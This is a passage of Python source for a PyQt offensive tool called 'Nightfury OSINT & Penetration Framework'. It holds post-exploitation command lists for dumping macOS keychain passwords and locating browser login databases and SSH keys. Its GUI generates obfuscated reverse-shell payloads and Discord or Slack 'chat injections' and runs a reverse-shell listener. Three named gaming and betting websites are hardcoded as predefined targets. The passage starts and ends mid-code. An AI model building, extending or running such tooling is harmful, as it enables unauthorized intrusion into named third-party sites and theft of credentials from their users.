            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        """macOS post-exploitation commands"""
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class ModuleLoader:
    """Dynamic module loader for external scripts"""
    
    def __init__(self):
        self.modules = {}
        self.module_directory = "modules"
        
        # Create module directory if it doesn't exist
        if not os.path.exists(self.module_directory):
            os.makedirs(self.module_directory)
    
    def load_modules(self):
        """Load all modules from the module directory"""
        self.modules.clear()
        
        for file_path in Path(self.module_directory).rglob("*.py"):
            try:
                module_name = file_path.stem
                spec = importlib.util.spec_from_file_location(module_name, file_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                # Check if module has the required interface
                if hasattr(module, 'execute') and callable(module.execute):
                    self.modules[module_name] = module
                    logger.info(f"Loaded module: {module_name}")
            except Exception as e:
                logger.error(f"Failed to load module {file_path}: {e}")
    
    def execute_module(self, module_name, *args, **kwargs):
        """Execute a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        return module.execute(*args, **kwargs)
    
    def list_modules(self):
        """List all available modules"""
        return list(self.modules.keys())
    
    def get_module_info(self, module_name):
        """Get information about a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        info = {
            'name': module_name,
            'file': inspect.getfile(module),
            'description': getattr(module, '__doc__', 'No description available'),
            'functions': []
        }
        
        # Get all functions in the module
        for name, obj in inspect.getmembers(module, inspect.isfunction):
            if obj.__module__ == module.__name__:
                info['functions'].append({
                    'name': name,
                    'signature': str(inspect.signature(obj)),
                    'docstring': inspect.getdoc(obj) or 'No documentation'
                })
        
        return info

class OSINTModule:
    """Base OSINT module for gathering intelligence"""
    
    def __init__(self):
        self.name = "Base OSINT Module"
        self.description = "Base class for OSINT modules"
        self.scraper = WebScraper()
    
    def execute(self, target, options=None):
        """Execute the OSINT investigation"""
        raise NotImplementedError("Subclasses must implement execute()")

class WebScraper:
    """Web scraping utility with anti-detection features"""
    
    def __init__(self, use_tor=False):
        self.use_tor = use_tor
        self.user_agent = UserAgent()
    
    def get_headers(self):
        """Generate random headers for requests"""
        return {
            'User-Agent': self.user_agent.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def scrape(self, url, method='GET', data=None):
        """Scrape a webpage"""
        try:
            headers = self.get_headers()
            
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, timeout=30)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=30)
            
            if response.status_code == 200:
                return response.text
            else:
                logger.error(f"Failed to scrape {url}: Status code {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error scraping {url}: {e}")
            return None

class TargetManager:
    """Manage predefined targets and configurations"""
    
    def __init__(self):
        self.targets = {
            'runehall.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming community website'
            },
            'runewager.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming betting platform'
            },
            'runechat.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Chat platform for gamers'
            }
        }
    
    def add_target(self, name, target_type, modules, notes=""):
        """Add a new target"""
        self.targets[name] = {
            'type': target_type,
            'modules': modules,
            'notes': notes
        }
    
    def remove_target(self, name):
        """Remove a target"""
        if name in self.targets:
            del self.targets[name]
    
    def get_target(self, name):
        """Get target information"""
        return self.targets.get(name, None)
    
    def list_targets(self):
        """List all targets"""
        return list(self.targets.keys())

# ==============================
# GUI APPLICATION
# ==============================

class ModuleLoaderThread(QThread):
    """Thread for loading modules in the background"""
    module_loaded = pyqtSignal(str)
    finished = pyqtSignal()
    
    def __init__(self, module_loader):
        super().__init__()
        self.module_loader = module_loader
    
    def run(self):
        """Load modules"""
        self.module_loader.load_modules()
        for module_name in self.module_loader.list_modules():
            self.module_loaded.emit(module_name)
        self.finished.emit()

class NightfuryApp(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Nightfury OSINT & Penetration Framework")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.encryption = EncryptionEngine()
        self.shell_generator = ReverseShellGenerator()
        self.post_exploit = PostExploitation()
        self.module_loader = ModuleLoader()
        self.target_manager = TargetManager()
        self.listener = None
        
        # Settings
        self.settings = QSettings("Nightfury", "Framework")
        
        # Setup GUI
        self._setup_ui()
        
        # Load modules
        self.load_modules()
        
        # Set dark theme
        self._apply_dark_theme()
        
        # Load saved settings
        self.load_settings()
    
    def _setup_ui(self):
        """Setup the user interface"""
        # Create central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        
        # Create splitter for main content and sidebar
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Create sidebar for module navigation
        self.sidebar = QWidget()
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(0, 0, 0, 0)
        
        # Module list
        sidebar_layout.addWidget(QLabel("Available Modules:"))
        self.module_list = QListWidget()
        self.module_list.itemClicked.connect(self.on_module_selected)
        sidebar_layout.addWidget(self.module_list)
        
        # Refresh modules button
        self.refresh_btn = QPushButton("Refresh Modules")
        self.refresh_btn.clicked.connect(self.load_modules)
        sidebar_layout.addWidget(self.refresh_btn)
        
        # Add sidebar to splitter
        splitter.addWidget(self.sidebar)
        
        # Create main content area
        self.content_area = QTabWidget()
        splitter.addWidget(self.content_area)
        
        # Set splitter proportions
        splitter.setSizes([200, 1200])
        
        # Create tabs
        self._create_dashboard_tab()
        self._create_reverse_shell_tab()
        self._create_post_exploit_tab()
        self._create_module_editor_tab()
        self._create_osint_tab()
        self._create_targets_tab()
        self._create_settings_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        # Create toolbar
        self._create_toolbar()
    
    def _create_toolbar(self):
        """Create the application toolbar"""
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(toolbar)
        
        # New action
        new_action = QAction(QIcon.fromTheme("document-new"), "New", self)
        new_action.setStatusTip("Create a new project")
        new_action.triggered.connect(self.new_project)
        toolbar.addAction(new_action)
        
        # Open action
        open_action = QAction(QIcon.fromTheme("document-open"), "Open", self)
        open_action.setStatusTip("Open an existing project")
        open_action.triggered.connect(self.open_project)
        toolbar.addAction(open_action)
        
        # Save action
        save_action = QAction(QIcon.fromTheme("document-save"), "Save", self)
        save_action.setStatusTip("Save the current project")
        save_action.triggered.connect(self.save_project)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        # Settings action
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.setStatusTip("Open settings")
        settings_action.triggered.connect(self.open_settings)
        toolbar.addAction(settings_action)
    
    def _create_dashboard_tab(self):
        """Create the dashboard tab"""
        dashboard_tab = QWidget()
        layout = QVBoxLayout(dashboard_tab)
        
        # Welcome message
        welcome_label = QLabel("<h1>Nightfury OSINT & Penetration Framework</h1>")
        welcome_label.setTextFormat(Qt.RichText)
        layout.addWidget(welcome_label)
        
        # Stats section
        stats_group = QGroupBox("Framework Statistics")
        stats_layout = QHBoxLayout()
        
        stats = [
            ("Modules Loaded", str(len(self.module_loader.list_modules()))),
            ("Predefined Targets", str(len(self.target_manager.list_targets()))),
            ("Listener Status", "Stopped")
        ]
        
        for stat_name, stat_value in stats:
            stat_widget = QWidget()
            stat_layout = QVBoxLayout(stat_widget)
            stat_layout.addWidget(QLabel(f"<b>{stat_name}</b>"))
            stat_layout.addWidget(QLabel(f"<h2>{stat_value}</h2>"))
            stats_layout.addWidget(stat_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Recent activity
        recent_group = QGroupBox("Recent Activity")
        recent_layout = QVBoxLayout()
        self.recent_activity = QTextEdit()
        self.recent_activity.setReadOnly(True)
        recent_layout.addWidget(self.recent_activity)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        # Quick actions
        quick_group = QGroupBox("Quick Actions")
        quick_layout = QHBoxLayout()
        
        # Quick action buttons
        self.quick_scan_btn = QPushButton("Quick Scan")
        self.quick_scan_btn.clicked.connect(self.quick_scan)
        quick_layout.addWidget(self.quick_scan_btn)
        
        self.generate_payload_btn = QPushButton("Generate Payload")
        self.generate_payload_btn.clicked.connect(self.quick_payload)
        quick_layout.addWidget(self.generate_payload_btn)
        
        self.exploit_target_btn = QPushButton("Exploit Target")
        self.exploit_target_btn.clicked.connect(self.quick_exploit)
        quick_layout.addWidget(self.exploit_target_btn)
        
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        self.content_area.addTab(dashboard_tab, "Dashboard")
    
    def _create_reverse_shell_tab(self):
        """Create the reverse shell generator tab"""
        shell_tab = QWidget()
        layout = QVBoxLayout(shell_tab)
        
        # Configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.shell_type = QComboBox()
        self.shell_type.addItems(["python", "powershell", "javascript", "html", "exe"])
        config_layout.addRow("Shell Type:", self.shell_type)
        
        self.lhost_input = QLineEdit("127.0.0.1")
        config_layout.addRow("LHOST:", self.lhost_input)
        
        self.lport_input = QLineEdit("4444")
        config_layout.addRow("LPORT:", self.lport_input)
        
        self.obfuscate_check = QCheckBox("Obfuscate Payload")
        self.obfuscate_check.setChecked(True)
        config_layout.addRow(self.obfuscate_check)
        
        self.platform_select = QComboBox()
        self.platform_select.addItems(["discord", "slack", "generic"])
        config_layout.addRow("Chat Platform:", self.platform_select)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Listener configuration
        listener_group = QGroupBox("Listener Configuration")
        listener_layout = QFormLayout()
        
        self.listener_host = QLineEdit("0.0.0.0")
        listener_layout.addRow("Listener Host:", self.listener_host)
        
        self.listener_port = QLineEdit("4444")
        listener_layout.addRow("Listener Port:", self.listener_port)
        
        button_layout = QHBoxLayout()
        self.start_listener_btn = QPushButton("Start Listener")
        self.start_listener_btn.clicked.connect(self.start_listener)
        button_layout.addWidget(self.start_listener_btn)
        
        self.stop_listener_btn = QPushButton("Stop Listener")
        self.stop_listener_btn.clicked.connect(self.stop_listener)
        self.stop_listener_btn.setEnabled(False)
        button_layout.addWidget(self.stop_listener_btn)
        
        listener_layout.addRow(button_layout)
        
        self.listener_status = QLabel("Status: Stopped")
        listener_layout.addRow(self.listener_status)
        
        listener_group.setLayout(listener_layout)
        layout.addWidget(listener_group)
        
        # Generate buttons
        button_layout = QHBoxLayout()
        
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        button_layout.addWidget(self.generate_btn)
        
        self.generate_injection_btn = QPushButton("Generate Chat Injection")
        self.generate_injection_btn.clicked.connect(self.generate_injection)
        button_layout.addWidget(self.generate_injection_btn)
        
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.clicked.connect(self.copy_payload)
        button_layout.addWidget(self.copy_btn)
        
        layout.addLayout(button_layout)
        
        # Payload display
        payload_group = QGroupBox("Generated Payload")
        payload_layout = QVBoxLayout()
        self.payload_display = QTextEdit()
        self.payload_display.setReadOnly(True)
        payload_layout.addWidget(self.payload_display)
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # Listener output
        output_group = QGroupBox("Listener Output")
        output_layout = QVBoxLayout()
        self.listener_output = QTextEdit()
        self.listener_output.setReadOnly(True)
        output_layout.addWidget(self.listener_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        self.content_area.addTab(shell_tab, "Reverse Shell")
    
    def _create_post_exploit_tab(self):
        """Create the post-exploitation tab"""
        post_tab = QWidget()
        layout = QVBoxLayout(post_tab)
        
        # Target configuration
        target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.target_os = QComboBox()
        self.target_os.addItems(["windows", "linux", "mac"])
        target_layout.addRow("Target OS:", self.target_os)
        
        self.target_host = QLineEdit()
        target_layout.addRow("Target Host:", self.target_host)
        
        self.target_port = QLineEdit("4444")
        target_layout.addRow("Target Port:", self.target_port)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("Post-Exploitation Actions")
        actions_layout = QVBoxLayout()
        
        self.get_passwords_btn = QPushButton("Extract Passwords")
        self.get_passwords_btn.clicked.connect(lambda: self.run_post_action('get_passwords'))
        actions_layout.addWidget(self.get_passwords_btn)
        
        self.escalate_btn = QPushButton("Escalate Privileges")
        self.escalate_btn.clicked.connect(lambda: self.run_post_action('escalate_privileges'))
        actions_layout.addWidget(self.escalate_btn)
        
        self.network_info_btn = QPushButton("Gather Network Info")
        self.network_info_btn.clicked.connect(lambda: self.run_post_action('network_info'))
        actions_layout.addWidget(self.network_info_btn)
        
        self.browser_data_btn = QPushButton("Extract Browser Data")
        self.browser_data_btn.clicked.connect(lambda: self.run_post_action('browser_data'))
        actions_layout.addWidget(self.browser_data_btn)
        
        self.system_info_btn = QPushButton("Gather System Info")
        self.system_info_btn.clicked.connect(lambda: self.run_post_action('system_info'))
        actions_layout.addWidget(self.system_info_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.results_display = QTextEdit()
        self.results_display.setReadOnly(True)
        results_layout.addWidget(self.results_display)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(post_tab, "Post-Exploitation")
    
    def _create_module_editor_tab(self):
        """Create the module editor tab"""
        editor_tab = QWidget()
        layout = QVBoxLayout(editor_tab)
        
        # Module info
        info_group = QGroupBox("Module Information")
        info_layout = QFormLayout()
        
        self.module_name = QLineEdit()
        info_layout.addRow("Module Name:", self.module_name)
        
        self.module_description = QTextEdit()
        self.module_description.setMaximumHeight(100)
        info_layout.addRow("Description:", self.module_description)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # Code editor
        editor_group = QGroupBox("Module Code")
        editor_layout = QVBoxLayout()
        self.code_editor = QTextEdit()
        editor_layout.addWidget(self.code_editor)
        editor_group.setLayout(editor_layout)
        layout.addWidget(editor_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.new_module_btn = QPushButton("New Module")
        self.new_module_btn.clicked.connect(self.new_module)
        button_layout.addWidget(self.new_module_btn)
        
        self.save_module_btn = QPushButton("Save Module")
        self.save_module_btn.clicked.connect(self.save_module)
        button_layout.addWidget(self.save_module_btn)
        
        self.load_module_btn = QPushButton("Load Module")
        self.load_module_btn.clicked.connect(self.load_module)
        button_layout.addWidget(self.load_module_btn)
        
        self.run_module_btn = QPushButton("Run Module")
        self.run_module_btn.clicked.connect(self.run_module)
        button_layout.addWidget(self.run_module_btn)
        
        layout.addLayout(button_layout)
        
        self.content_area.addTab(editor_tab, "Module Editor")
    
    def _create_osint_tab(self):
        """Create the OSINT tab"""
        osint_tab = QWidget()
        layout = QVBoxLayout(osint_tab)
        
        # Target input
        target_group = QGroupBox("OSINT Target")
        target_layout = QFormLayout()
        
        self.osint_target = QLineEdit()
        self.osint_target.setPlaceholderText("Enter domain, IP, username, or email")
        target_layout.addRow("Target:", self.osint_target)
        
        self.osint_type = QComboBox()
        self.osint_type.addItems(["domain", "ip", "username", "email", "phone"])
        target_layout.addRow("Type:", self.osint_type)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("OSINT Actions")
        actions_layout = QHBoxLayout()
        
        self.whois_btn = QPushButton("WHOIS Lookup")
        self.whois_btn.clicked.connect(self.whois_lookup)
        actions_layout.addWidget(self.whois_btn)
        
        self.dns_btn = QPushButton("DNS Enumeration")
        self.dns_btn.clicked.connect(self.dns_enum)
        actions_layout.addWidget(self.dns_btn)
        
        self.subdomain_btn = QPushButton("Subdomain Scan")
        self.subdomain_btn.clicked.connect(self.subdomain_scan)
        actions_layout.addWidget(self.subdomain_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("OSINT Results")
        results_layout = QVBoxLayout()
        self.osint_results = QTextEdit()
        self.osint_results.setReadOnly(True)
        results_layout.addWidget(self.osint_results)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(osint_tab, "OSINT")
    
    def _create_targets_tab(self):
        """Create the targets management tab"""
        targets_tab = QWidget()
        layout = QVBoxLayout(targets_tab)
        
        # Targets list
        targets_group = QGroupBox("Predefined Targets")
        targets_layout = QVBoxLayout()
        
        self.targets_list = QListWidget()
        self.targets_list.addItems(self.target_manager.list_targets())
        self.targets_list.itemClicked.connect(self.on_target_selected)
        targets_layout.addWidget(self.targets_list)
        
        # Add/remove buttons
        target_buttons = QHBoxLayout()
        
        self.add_target_btn = QPushButton("Add Target")
        self.add_target_btn.clicked.connect(self.add_target)
        target_buttons.addWidget(self.add_target_btn)
        
        self.remove_target_btn = QPushButton("Remove Target")
        self.remove_target_btn.clicked.connect(self.remove_target)
        target_buttons.addWidget(self.remove_target_btn)
        
        targets_layout.addLayout(target_buttons)
        targets_group.setLayout(targets_layout)
        layout.addWidget(targets_group)
        
        # Target details
        details_group = QGroupBox("Target Details")
        details_layout = QFormLayout()
        
        self.target_name = QLineEdit()
        details_layout.addRow("Name:", self.target_name)
        
        self.target_type = QComboBox()
        self.target_type.addItems(["website", "server", "network", "application"])
        details_layout.addRow("Type:", self.target_type)
        
        self.target_modules = QLineEdit()
        self.target_modules.setPlaceholderText("Comma-separated module names")
        details_layout.addRow("Modules:", self.target_modules)
        
        self.target_notes = QTextEdit()
        self.target_notes.setMaximumHeight(100)
        details_layout.addRow("Notes:", self.target_notes)
        
        self.save_target_btn = QPushButton("Save Changes")
        self.save_target_btn.clicked.connect(self.save_target)
        details_layout.addRow(self.save_target_btn)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
        
        self.content_area.addTab(targets_tab, "Targets")
    
    def _create_settings_tab(self):
        """Create the settings tab"""
        settings_tab = QWidget()
        layout = QVBoxLayout(settings_tab)
        
        # General settings
        general_group = QGroupBox("General Settings")
        general_layout = QFormLayout()
        
        self.auto_load_modules = QCheckBox("Auto-load modules on startup")
        general_layout.addRow("Auto-load:", self.auto_load_modules)
        
        self.auto_save = QCheckBox("Auto-save projects")
        general_layout.addRow("Auto-save:", self.auto_save)
        
        self.dark_mode = QCheckBox("Dark mode")
        self.dark_mode.setChecked(True)
        self.dark_mode.stateChanged.connect(self.toggle_dark_mode)
        general_layout.addRow("Theme:", self.dark_mode)
        
        general_group.setLayout(general_layout)
        layout.addWidget(general_group)
        
        # Network settings
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.proxy_host = QLineEdit()
        network_layout.addRow("Proxy Host:", self.proxy_host)
        
        self.proxy_port = QLineEdit()
        network_layout.addRow("Proxy Port:", self.proxy_port)
        
        self.use_tor = QCheckBox("Use Tor network")
        network_layout.addRow("Tor:", self.use_tor)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Save settings button
        self.save_settings_btn = QPushButton("Save Settings")
        self.save_settings_btn.clicked.connect(self.save_settings)
        layout.addWidget(self.save_settings_btn)
        
        self.content_area.addTab(settings_tab, "Settings")
    
    def _apply_dark_theme(self):
        """Apply a dark theme to the application"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.Window, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.WindowText, Qt.white)
        dark_palette.setColor(QPalette.Base, QColor(25, 25, 25))
        dark_palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ToolTipBase, Qt.white)
        dark_palette.setColor(QPalette.ToolTipText, Qt.white)
        dark_palette.setColor(QPalette.Text, Qt.white)
        dark_palette.setColor(QPalette.Button, QColor(53, 53, 53))
        dark_palette.setColor(QPalette.ButtonText, Qt.white)
        dark_palette.setColor(QPalette.BrightText, Qt.red)
        dark_palette.setColor(QPalette.Link, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
        
        self.setPalette(dark_palette)
        self.setStyleSheet("""
            QToolTip { color: #ffffff; background-color: #2a82da; border: 1px solid white; }
            QMenu::item:selected { background-color: #2a82da; }
            QTabWidget::pane { border: 1px solid #444; }
            QGroupBox { font-weight: bold; }
            QTextEdit, QLineEdit, QListWidget { background-color: #252525; color: #ffffff; }
        """)
    
    def load_modules(self):
        """Load modules from the modules directory"""
        self.status_bar.showMessage("Loading modules...")
        self.module_list.clear()
        
        # Start module loading in a separate thread
        self.loader_thread = ModuleLoaderThread(self.module_loader)
        self.loader_thread.module_loaded.connect(self.add_module_to_list)
        self.loader_thread.finished.connect(lambda: self.status_bar.showMessage("Modules loaded", 3000))
        self.loader_thread.start()
    
    def add_module_to_list(self, module_name):
        """Add a module to the module list"""
        item = QListWidgetItem(module_name)
        self.module_list.addItem(item)
    
    def on_module_selected(self, item):
        """Handle module selection"""
        module_name = item.text()
        try:
            info = self.module_loader.get_module_info(module_name)
            self.show_module_info(info)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to get module info: {e}")
    
    def show_module_info(self, info):
        """Display module information"""
        # Display module info in the dashboard
        info_text = f"""
        Module Name: {info['name']}
        Description: {info['description']}
        File: {info['file']}
        
        Functions:
        """
        
        for func in info['functions']:
            info_text += f"\n- {func['name']}{func['signature']}"
            if func['docstring']:
                info_text += f"\n  {func['docstring']}\n"
        
        self.recent_activity.setPlainText(info_text)
    
    def generate_payload(self):
        """Generate a reverse shell payload"""
        try:
            shell_type = self.shell_type.currentText()
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            obfuscate = self.obfuscate_check.isChecked()
            
            options = {'obfuscate': obfuscate}
            payload = self.shell_generator.generate(shell_type, lhost, lport, options)
            
            self.payload_display.setPlainText(payload)
            self.status_bar.showMessage("Payload generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate payload: {e}")
    
    def generate_injection(self):
        """Generate a chat injection payload"""
        try:
            lhost = self.lhost_input.text()
            lport = int(self.lport_input.text())
            platform = self.platform_select.currentText()
            
            injection = self.shell_generator.generate_chat_injection(lhost, lport, platform)
            
            self.payload_display.setPlainText(injection)
            self.status_bar.showMessage("Injection generated", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate injection: {e}")
    
    def copy_payload(self):
        """Copy payload to clipboard"""
        payload = self.payload_display.toPlainText()
        if payload:
            clipboard = QApplication.clipboard()
            clipboard.setText(payload)
            self.status_bar.showMessage("Payload copied to clipboard", 3000)
        else:
            QMessageBox.warning(self, "Warning", "No payload to copy")
    
    def start_listener(self):
        """Start the reverse shell listener"""
        try:
            host = self.listener_host.text()
            port = int(self.listener_port.text())
            
            if self.listener and self.listener.isRunning():
                self.listener.stop()
                self.listener.wait()
            
            self.listener = ReverseShellListener(host, port)
            self.listener.connection_update.connect(self.update_listener_status)
            self.listener.command_output.connect(self.update_listener_output)
            self.listener.start()
            
            self.start_listener_btn.setEnabled(False)
            self.stop_listener_btn.setEnabled(True)
            self.listener_status.setText("Status: Listening")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to start listener: {e}")
    
    def stop_listener(self):
        """Stop the reverse shell listener"""
        if self.listener and self.listener.isRunning():
            self.listener.stop()
            self.listener.wait()
            
            self.start_listener_btn.setEnabled(True)
            self.stop_listener_btn.setEnabled(False)
            self.listener_status.setText("Status: Stopped")
    
    def update_listener_status(self, message):
        """Update the listener status display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def update_listener_output(self, message):
        """Update the listener output display"""
        self.listener_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    
    def run_post_action(self, action):
        """Run a post-exploitation action"""
        try:
            os_type = self.target_os.currentText()
            commands = self.post_exploit.execute(os_type, action)
            
            result = f"Commands for {action} on {os_type}:\n\n"
            for cmd in commands:
                result += f"{cmd}\n"
            
            self.results_display.setPlainText(result)
            self.status_bar.showMessage(f"Generated {action} commands", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to generate commands: {e}")
    
    def new_module(self):
        """Create a new module"""
        self.module_name.clear()
        self.module_description.clear()
        self.code_editor.clear()
        
        # Add template code
        template = '''
def execute(*args, **kwargs):
    """
    Module execution function.
    Add your module code here.
    """
    # Your code here
    return {"result": "Module executed successfully"}
'''
        self.code_editor.setPlainText(template)
    
    def save_module(self):
        """Save the current module"""
        try:
            name = self.module_name.text().strip()
            if not name:
                QMessageBox.warning(self, "Warning", "Please enter a module name")
                return
            
            description = self.module_description.toPlainText().strip()
            code = self.code_editor.toPlainText()
            
            # Create module file
            module_path = os.path.join("modules", f"{name}.py")
            with open(module_path, "w") as f:
                if description:
                    f.write(f'"""{description}"""\n\n')
                f.write(code)
            
            self.status_bar.showMessage(f"Module {name} saved", 3000)
            
            # Reload modules
            self.load_modules()
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to save module: {e}")
    
    def load_module(self):
        """Load a module for editing"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to load")
            return
        
        module_name = selected_items[0].text()
        try:
            info = self.module_loader.get_module_info(module_name)
            
            self.module_name.setText(module_name)
            self.module_description.setPlainText(info.get('description', ''))
            
            # Read the module file
            with open(info['file'], 'r') as f:
                code = f.read()
            
            self.code_editor.setPlainText(code)
            self.status_bar.showMessage(f"Module {module_name} loaded", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to load module: {e}")
    
    def run_module(self):
        """Run the current module"""
        selected_items = self.module_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a module to run")
            return
        
        module_name = selected_items[0].text()
        try:
            result = self.module_loader.execute_module(module_name)
            QMessageBox.information(self, "Module Result", f"Module executed successfully:\n\n{result}")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to execute module: {e}")
    
    def whois_lookup(self):
        """Perform a WHOIS lookup"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            w = whois.whois(target)
            result = json.dumps(w, indent=2, default=str)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("WHOIS lookup completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"WHOIS lookup failed: {e}")
    
    def dns_enum(self):
        """Perform DNS enumeration"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME']
            results = {}
            
            for record_type in record_types:
                try:
                    answers = dns.resolver.resolve(target, record_type)
                    results[record_type] = [str(r) for r in answers]
                except:
                    results[record_type] = []
            
            result = json.dumps(results, indent=2)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("DNS enumeration completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"DNS enumeration failed: {e}")
    
    def subdomain_scan(self):
        """Perform subdomain scanning"""
        target = self.osint_target.text().strip()
        if not target:
            QMessageBox.warning(self, "Warning", "Please enter a target")
            return
        
        try:
            common_subdomains = [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
                'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3'
            ]
            
            found_subdomains = []
            
            for subdomain in common_subdomains:
                full_domain = f"{subdomain}.{target}"
                try:
                    socket.gethostbyname(full_domain)
                    found_subdomains.append(full_domain)
                except:
                    pass
            
            result = f"Found {len(found_subdomains)} subdomains:\n\n" + "\n".join(found_subdomains)
            self.osint_results.setPlainText(result)
            self.status_bar.showMessage("Subdomain scan completed", 3000)
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Subdomain scan failed: {e}")
    
    def on_target_selected(self, item):
        """Handle target selection"""
        target_name = item.text()
